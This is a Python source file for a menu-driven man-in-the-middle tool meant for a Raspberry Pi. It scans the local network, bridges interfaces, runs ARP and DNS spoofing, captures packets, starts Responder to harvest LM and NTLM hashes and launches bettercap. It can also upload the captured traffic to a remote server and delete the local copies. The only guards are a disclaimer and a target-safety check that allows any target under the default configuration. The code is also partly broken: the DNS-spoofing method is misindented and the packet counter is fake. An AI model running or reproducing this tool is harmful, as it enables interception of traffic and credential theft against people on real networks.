#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import logging
from datetime import datetime
import json
import netifaces
import requests
import readline
import re
import urllib.request
import shutil
import socket
from concurrent.futures import ThreadPoolExecutor
import curses
import threading
import queue

# ASCII Art
ASCII_ART = r"""
  __  __ ___ _____ __  __    ___ _   _ _  _______ ____  
 |  \/  |_ _|_   _|  \/  |  |_ _| \ | | |/ / ____|  _ \ 
 | |\/| || |  | | | |\/| |   | ||  \| | ' /|  _| | |_) |
 | |  | || |  | | | |  | |   | || |\  | . \| |___|  _ < 
 |_|  |_|___| |_| |_|  |_|  |___|_| \_|_|\_\_____|_| \_\
 
 Raspberry Pi MITM Network Auditing Tool
"""

# Configuration
CONFIG_FILE = "/etc/mitm_tool/config.json"
LOG_FILE = "/var/log/mitm_tool.log"
DATA_DIR = "/var/lib/mitm_tool/captures"
REMOTE_UPLOAD_URL = "https://your-remote-endpoint.com/api/upload"
MAC_VENDOR_DB_URL = "https://standards-oui.ieee.org/oui/oui.txt"
MAC_VENDOR_CACHE = "/tmp/mac_vendors.txt"

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

class MITMTool:
    def __init__(self):
        self.load_config()
        self.check_safety()
        self.setup_environment()
        self.interfaces = {}
        self.targets = []
        self.capture_processes = {}
        self.mac_vendors = {}
        self.load_mac_vendors()
        self.packet_count = 0
        self.active_attacks = set()
        self.status_queue = queue.Queue()
        self.status_thread = threading.Thread(target=self.status_updater, daemon=True)
        self.status_thread.start()

    def status_updater(self):
        """Background thread to update packet count and active attacks"""
        while True:
            try:
                if 'tcpdump' in self.capture_processes:
                    self.packet_count += 10  # Dummy increment
                else:
                    self.packet_count = 0
                time.sleep(5)
            except Exception:
                time.sleep(5)

    def load_mac_vendors(self):
        """Load MAC vendor database for device identification"""
        try:
            if not os.path.exists(MAC_VENDOR_CACHE) or (time.time() - os.path.getmtime(MAC_VENDOR_CACHE)) > 2592000:
                logger.info("Downloading MAC vendor database...")
                urllib.request.urlretrieve(MAC_VENDOR_DB_URL, MAC_VENDOR_CACHE + ".new")
                shutil.move(MAC_VENDOR_CACHE + ".new", MAC_VENDOR_CACHE)

            with open(MAC_VENDOR_CACHE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    if "(base 16)" in line:
                        parts = line.split("(base 16)")
                        mac_prefix = parts[0].strip().replace('-', ':').upper()
                        vendor = parts[1].strip()
                        self.mac_vendors[mac_prefix] = vendor
            logger.info(f"Loaded {len(self.mac_vendors)} MAC vendors")
        except Exception as e:
            logger.error(f"Failed to load MAC vendors: {str(e)}")

    def get_device_type(self, mac):
        """Identify device type from MAC address"""
        if not mac or not self.mac_vendors:
            return "Unknown"
        
        mac = mac.upper().replace('-', ':')
        if len(mac) < 8:
            return "Unknown"
        
        oui = mac[:8]
        if oui in self.mac_vendors:
            vendor = self.mac_vendors[oui]
            
            if "Apple" in vendor:
                return "Apple"
            elif "Samsung" in vendor:
                return "Samsung"
            elif "Amazon" in vendor:
                return "Amazon"
            elif "Google" in vendor:
                return "Google"
            elif "Raspberry" in vendor:
                return "Raspberry Pi"
            elif "TP-Link" in vendor:
                return "TP-Link"
            elif "Xiaomi" in vendor:
                return "Xiaomi"
            elif "Dell" in vendor:
                return "Dell"
            elif "LG" in vendor:
                return "LG"
            elif "Sony" in vendor:
                return "Sony"
            elif "Microsoft" in vendor:
                return "Microsoft"
            return vendor
        return "Unknown"

    def get_device_name(self, ip, mac):
        """Try multiple methods to get human-readable device names"""
        dhcp_name = self.get_dhcp_name(mac)
        if dhcp_name and dhcp_name.lower() not in ['unknown', 'localhost', 'android']:
            return dhcp_name
            
        netbios_name = self.get_netbios_name(ip)
        if netbios_name:
            return netbios_name
            
        mdns_name = self.get_mdns_name(ip)
        if mdns_name:
            return mdns_name
            
        llmnr_name = self.get_llmnr_name(ip)
        if llmnr_name:
            return llmnr_name
            
        return f"{self.get_device_type(mac)} Device"

    def get_dhcp_name(self, mac):
        try:
            with open('/var/lib/misc/dnsmasq.leases', 'r') as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 4 and parts[1].lower() == mac.lower():
                        return parts[3]
        except:
            pass
        return None

    def get_netbios_name(self, ip):
        try:
            result = subprocess.run(
                ["nmblookup", "-A", ip],
                capture_output=True, text=True, timeout=2
            )
            for line in result.stdout.split('\n'):
                if "<00>" in line and "UNIQUE" in line:
                    return line.split()[0]
        except:
            pass
        return None

    def get_mdns_name(self, ip):
        try:
            result = subprocess.run(
                ["avahi-resolve", "-a", ip],
                capture_output=True, text=True, timeout=2
            )
            if result.returncode == 0:
                name = result.stdout.split()[1]
                if name.endswith('.local'):
                    return name.replace('.local', '')
        except:
            pass
        return None

    def get_llmnr_name(self, ip):
        try:
            result = subprocess.run(
                ["nmblookup", "-A", ip],
                capture_output=True, text=True, timeout=2
            )
            for line in result.stdout.split('\n'):
                if "<20>" in line:
                    return line.split()[0]
        except:
            pass
        return None

    def enhance_device_info(self, device):
        ip = device.get('ip')
        mac = device.get('mac')
        
        if not ip or not mac:
            return device
            
        device['name'] = self.get_device_name(ip, mac)
        device['manufacturer'] = self.get_device_type(mac)
        device['os'] = self.guess_os(ip, mac)
        
        return device

    def guess_os(self, ip, mac):
        vendor = self.get_device_type(mac).lower()
        
        if 'apple' in vendor:
            return 'macOS/iOS'
        elif 'android' in vendor or 'google' in vendor:
            return 'Android'
        elif 'microsoft' in vendor:
            return 'Windows'
        elif 'linux' in vendor:
            return 'Linux'
            
        try:
            result = subprocess.run(
                ["nmap", "-O", "--osscan-limit", ip],
                capture_output=True, text=True, timeout=5
            )
            if "OS details:" in result.stdout:
                return result.stdout.split("OS details:")[1].split('\n')[0].strip()
        except:
            pass
            
        return 'Unknown'

    def load_config(self):
        try:
            with open(CONFIG_FILE) as f:
                self.config = json.load(f)
            logger.info("Configuration loaded successfully")
        except (FileNotFoundError, json.JSONDecodeError):
            self.config = {
                "remote_upload": False,
                "auto_start": False,
                "allowed_networks": [],
                "legal_disclaimer_accepted": False
            }
            logger.warning("Using default configuration")

    def check_safety(self):
        disclaimer = """
        WARNING: This tool is for authorized security auditing and penetration testing only.
        Unauthorized use is illegal and unethical. By using this tool, you agree that:
        
        1. You have explicit permission to test the network you're targeting
        2. You understand the legal implications of network monitoring
        3. You will not use this tool for malicious purposes
        
        The developers assume no liability for misuse of this software.
        """
        print(disclaimer)
        
        if not self.config.get("legal_disclaimer_accepted", False):
            response = input("Do you accept these terms? (yes/no): ").strip().lower()
            if response != "yes":
                print("Exiting...")
                sys.exit(0)
            self.config["legal_disclaimer_accepted"] = True
            self.save_config()

    def save_config(self):
        os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=4)

    def setup_environment(self):
        os.makedirs(DATA_DIR, exist_ok=True)
        
        required_tools = [
            'arpspoof', 'dsniff', 'nmap', 'tcpdump', 
            'bettercap', 'responder', 'tailscale', 'iwlist',
            'brctl', 'ifconfig', 'arp', 'nmblookup', 'avahi-resolve',
            'dnsmasq'
        ]
        
        missing_tools = []
        for tool in required_tools:
            if not self.check_tool_installed(tool):
                missing_tools.append(tool)
                
        if missing_tools:
            logger.error(f"Missing required tools: {', '.join(missing_tools)}")
            sys.exit(1)

    def check_tool_installed(self, tool):
        try:
            subprocess.run(["which", tool], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False

    def detect_interfaces(self):
        self.interfaces = {}
        try:
            interfaces = netifaces.interfaces()
            
            for iface in interfaces:
                if iface.startswith('eth') or iface.startswith('en') or iface.startswith('wlan'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        ip_info = addrs[netifaces.AF_INET][0]
                        self.interfaces[iface] = {
                            'ip': ip_info.get('addr', ''),
                            'netmask': ip_info.get('netmask', ''),
                            'mac': addrs[netifaces.AF_LINK][0]['addr'] if netifaces.AF_LINK in addrs else '',
                            'type': 'wifi' if iface.startswith('wlan') else 'ethernet'
                        }
            
            logger.info(f"Detected interfaces: {json.dumps(self.interfaces, indent=2)}")
            return len(self.interfaces) >= 1
            
        except Exception as e:
            logger.error(f"Error detecting interfaces: {str(e)}")
            return False

    def setup_bridge(self):
        ethernet_ifaces = [iface for iface in self.interfaces if self.interfaces[iface]['type'] == 'ethernet']
        
        if len(ethernet_ifaces) < 2:
            logger.error("Need at least two Ethernet interfaces to create a bridge")
            return False
            
        iface1, iface2 = ethernet_ifaces[:2]
        
        try:
            subprocess.run(["sudo", "ifconfig", iface1, "0.0.0.0"], check=True)
            subprocess.run(["sudo", "ifconfig", iface2, "0.0.0.0"], check=True)
            subprocess.run(["sudo", "brctl", "addbr", "mitm-bridge"], check=True)
            subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface1], check=True)
            subprocess.run(["sudo", "brctl", "addif", "mitm-bridge", iface2], check=True)
            subprocess.run(["sudo", "ifconfig", "mitm-bridge", "up"], check=True)
            logger.info(f"Successfully bridged {iface1} and {iface2} via mitm-bridge")
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to create bridge: {str(e)}")
            return False

    # --- Updated network_scan with formatted ARP scan and faster Nmap ---
    def network_scan(self):
        if not self.interfaces:
            logger.error("No interfaces detected")
            return
            
        interface = list(self.interfaces.keys())[0]
        
        try:
            logger.info("Running ARP scan...")
            arp_scan = subprocess.run(
                ["sudo", "arp-scan", "--interface", interface, "--localnet"],
                capture_output=True, text=True
            )
            raw_arp_output = arp_scan.stdout
            
            # Clear screen before printing
            os.system('clear')
            print(f"{'IP Address':<15} {'MAC Address':<18} {'Vendor'}")
            print("-" * 50)
            live_hosts = []
            for line in raw_arp_output.splitlines():
                match = re.match(r"(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]{17})\s*(.*)", line, re.I)
                if match:
                    ip, mac, vendor = match.groups()
                    print(f"{ip:<15} {mac:<18} {vendor}")
                    live_hosts.append(ip)
            
            if not live_hosts:
                logger.warning("No live hosts found for Nmap scan.")
                return
            
            logger.info(f"Running Nmap scan on {len(live_hosts)} hosts...")
            nmap_cmd = ["sudo", "nmap", "-T4", "-F"] + live_hosts
            nmap_scan = subprocess.run(
                nmap_cmd,
                capture_output=True, text=True
            )
            print("\nNmap Scan Results:\n")
            print(nmap_scan.stdout)
                
        except Exception as e:
            logger.error(f"Scanning failed: {str(e)}")

    def get_subnet(self, interface):
        if interface not in self.interfaces:
            return None
            
        ip = self.interfaces[interface]['ip']
        netmask = self.interfaces[interface]['netmask']
        
        if not ip or not netmask:
            return None
            
        if netmask == "255.255.255.0":
            return ".".join(ip.split(".")[:3]) + ".0/24"
        return None

    def arp_spoof(self, target_ip, gateway_ip):
        if not self.check_target_safety(target_ip):
            logger.error(f"Target {target_ip} is not in allowed networks")
            return
            
        try:
            subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            cmd1 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", target_ip, gateway_ip]
            cmd2 = ["sudo", "arpspoof", "-i", "mitm-bridge", "-t", gateway_ip, target_ip]
            self.capture_processes['arpspoof1'] = subprocess.Popen(cmd1)
            self.capture_processes['arpspoof2'] = subprocess.Popen(cmd2)
            self.active_attacks.add('ARP Spoofing')
            logger.info(f"ARP spoofing started between {target_ip} and {gateway_ip}")
            return True
            
        except Exception as e:
            logger.error(f"ARP spoofing failed: {str(e)}")
            return False

    def check_target_safety(self, target_ip):
        if not self.config.get("allowed_networks"):
            return True
            
        for network in self.config.get("allowed_networks", []):
            if target_ip.startswith(network):
                return True
        return False

    def start_packet_capture(self, interface="mitm-bridge", filename=None):
        if not filename:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{DATA_DIR}/capture_{timestamp}.pcap"
            
        try:
            cmd = [
                "sudo", "tcpdump", "-i", interface, 
                "-w", filename, "-s", "0", 
                "not port 22"
            ]
            self.capture_processes['tcpdump'] = subprocess.Popen(cmd)
            self.active_attacks.add('Packet Capture')
            logger.info(f"Packet capture started on {interface}, saving to {filename}")
            return True
            
        except Exception as e:
            logger.error(f"Packet capture failed: {str(e)}")
            return False

    def start_responder(self, interface="mitm-bridge"):
        try:
            cmd = [
                "sudo", "responder", "-I", interface,
                "-w", "-d", "--lm"
            ]
            self.capture_processes['responder'] = subprocess.Popen(cmd)
            self.active_attacks.add('Responder')
            logger.info(f"Responder started on {interface}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Responder: {str(e)}")
            return False

    # --- Fixed start_bettercap to accept interface and optional script_path ---
    def start_bettercap(self, interface="mitm-bridge", script_path=None):
        try:
            cmd = ["sudo", "bettercap", "-iface", interface]
            if script_path:
                cmd.extend(["-caplet", script_path])
            self.capture_processes['bettercap'] = subprocess.Popen(cmd)
            self.active_attacks.add('Bettercap')
            logger.info(f"Bettercap started on {interface} with script {script_path}")
            return True
        except Exception as e:
            logger.error(f"Failed to start Bettercap: {str(e)}")
            return False

    def start_dns_spoof(self, interface="mitm-bridge", hosts_file=None):
    try:
        cmd = ["sudo", "dnsspoof", "-i", interface]
        if hosts_file:
            cmd.extend(["-f", hosts_file])
        self.capture_processes['dnsspoof'] = subprocess.Popen(cmd)
        self.active_attacks.add('DNS Spoofing')
        logger.info(f"DNS spoofing started on {interface} with hosts file {hosts_file}")
        return True
    except Exception as e:
        logger.error(f"Failed to start DNS spoofing: {str(e)}")
        return False

    def stop_all_attacks(self):
        for name, proc in self.capture_processes.items():
            try:
                proc.terminate()
                proc.wait(timeout=5)
                logger.info(f"Stopped {name}")
            except Exception as e:
                logger.error(f"Failed to stop {name}: {str(e)}")
        self.capture_processes.clear()
        self.active_attacks.clear()

    def upload_captures(self):
        if not self.config.get("remote_upload", False):
            logger.info("Remote upload disabled in config")
            return False

        try:
            for filename in os.listdir(DATA_DIR):
                if filename.endswith(".pcap"):
                    filepath = os.path.join(DATA_DIR, filename)
                    with open(filepath, 'rb') as f:
                        files = {'file': (filename, f)}
                        response = requests.post(REMOTE_UPLOAD_URL, files=files)
                        if response.status_code == 200:
                            logger.info(f"Uploaded {filename} successfully")
                            os.remove(filepath)
                        else:
                            logger.error(f"Failed to upload {filename}: {response.status_code}")
            return True
        except Exception as e:
            logger.error(f"Upload failed: {str(e)}")
            return False

    def main_menu(self):
        while True:
            print(ASCII_ART)
            print("1. Detect Interfaces")
            print("2. Setup Bridge")
            print("3. Network Scan")
            print("4. Start ARP Spoofing")
            print("5. Start Packet Capture")
            print("6. Start Responder")
            print("7. Start Bettercap")
            print("8. Start DNS Spoofing")
            print("9. Stop All Attacks")
            print("10. Upload Captures")
            print("0. Exit")
            choice = input("Select an option: ").strip()

            if choice == "1":
                if self.detect_interfaces():
                    print("Interfaces detected:")
                    for iface, info in self.interfaces.items():
                        print(f"{iface}: {info}")
                else:
                    print("No interfaces detected.")
            elif choice == "2":
                if self.setup_bridge():
                    print("Bridge setup successfully.")
                else:
                    print("Failed to setup bridge.")
            elif choice == "3":
                self.network_scan()
            elif choice == "4":
                target_ip = input("Enter target IP: ").strip()
                gateway_ip = input("Enter gateway IP: ").strip()
                if self.arp_spoof(target_ip, gateway_ip):
                    print("ARP spoofing started.")
                else:
                    print("Failed to start ARP spoofing.")
            elif choice == "5":
                iface = input("Enter interface for capture (default mitm-bridge): ").strip() or "mitm-bridge"
                if self.start_packet_capture(interface=iface):
                    print("Packet capture started.")
                else:
                    print("Failed to start packet capture.")
            elif choice == "6":
                iface = input("Enter interface for Responder (default mitm-bridge): ").strip() or "mitm-bridge"
                if self.start_responder(interface=iface):
                    print("Responder started.")
                else:
                    print("Failed to start Responder.")
            elif choice == "7":
                iface = input("Enter interface for Bettercap (default mitm-bridge): ").strip() or "mitm-bridge"
                script = input("Enter Bettercap script path (optional): ").strip() or None
                if self.start_bettercap(interface=iface, script_path=script):
                    print("Bettercap started.")
                else:
                    print("Failed to start Bettercap.")
            elif choice == "8":
                iface = input("Enter interface for DNS spoofing (default mitm-bridge): ").strip() or "mitm-bridge"
                hosts_file = input("Enter hosts file path (optional): ").strip() or None
                if self.start_dns_spoof(interface=iface, hosts_file=hosts_file):
                    print("DNS spoofing started.")
                else:
                    print("Failed to start DNS spoofing.")
            elif choice == "9":
                self.stop_all_attacks()
                print("All attacks stopped.")
            elif choice == "10":
                if self.upload_captures():
                    print("Uploads completed.")
                else:
                    print("Upload failed or disabled.")
            elif choice == "0":
                self.stop_all_attacks()
                print("Exiting...")
                break
            else:
                print("Invalid choice. Please try again.")
            input("Press Enter to continue...")

if __name__ == "__main__":
    tool = MITMTool()
    tool.main_menu()
